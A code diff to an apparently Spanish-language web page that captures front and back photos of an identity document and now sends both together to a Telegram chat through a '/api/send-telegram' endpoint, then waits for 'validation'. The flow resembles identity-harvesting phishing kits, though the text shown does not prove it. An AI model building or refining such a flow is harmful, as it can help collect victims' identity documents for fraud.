@@ -207,19 +207,24 @@
             appState.capturedPhotos[appState.currentSide] = photoData;
             console.log(`✅ Foto ${appState.currentSide} capturada`);
 
-            // Enviar a Telegram
-            await sendPhotoToTelegram(photoData, appState.currentSide);
-
-            // Actualizar UI según el lado capturado
+            // Si es frontal, NO enviar aún, solo cambiar UI
             if (appState.currentSide === 'frontal') {
-                // Cambiar a captura trasera
+                console.log('✅ Foto frontal capturada, cambiando a trasera...');
+                // Cambiar a captura trasera INMEDIATAMENTE
                 appState.currentSide = 'trasera';
                 updateUIForSide('trasera');
                 elements.captureBtn.disabled = false;
-                console.log('🔄 Listo para capturar lado trasero');
+                console.log('📸 Listo para capturar lado trasero');
             } else {
-                // Ambos lados capturados
-                console.log('✅ Ambos lados capturados, mostrando botón continuar');
+                // Ambos lados capturados, ahora sí enviar TODO
+                console.log('✅ Ambos lados capturados, enviando a Telegram...');
+                window.loadingOverlay.showSending('Enviando documentos...');
+                
+                // Enviar ambas fotos
+                await sendPhotoToTelegram(appState.capturedPhotos.frontal, 'frontal');
+                await sendPhotoToTelegram(appState.capturedPhotos.trasera, 'trasera');
+                
+                // Mostrar botón continuar
                 elements.captureBtn.style.display = 'none';
                 if (elements.continueBtn) {
                     elements.continueBtn.style.display = 'block';
@@ -262,8 +267,6 @@
 
         console.log(`📤 Enviando foto ${side} a Telegram con sessionId:`, sessionId);
 
-        window.loadingOverlay.showSending(`Enviando foto ${side}...`);
-
         try {
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
@@ -285,8 +288,10 @@
 
             console.log(`✅ Foto ${side} enviada exitosamente, Message ID:`, result.messageId);
 
-            // Mantener overlay visible esperando respuesta de Telegram
-            window.loadingOverlay.show('Esperando validación...');
+            // Si es la trasera (última), mantener overlay esperando respuesta
+            if (side === 'trasera') {
+                window.loadingOverlay.show('Esperando validación...');
+            }
 
         } catch (error) {
             console.error(`❌ Error al enviar foto ${side}:`, error);
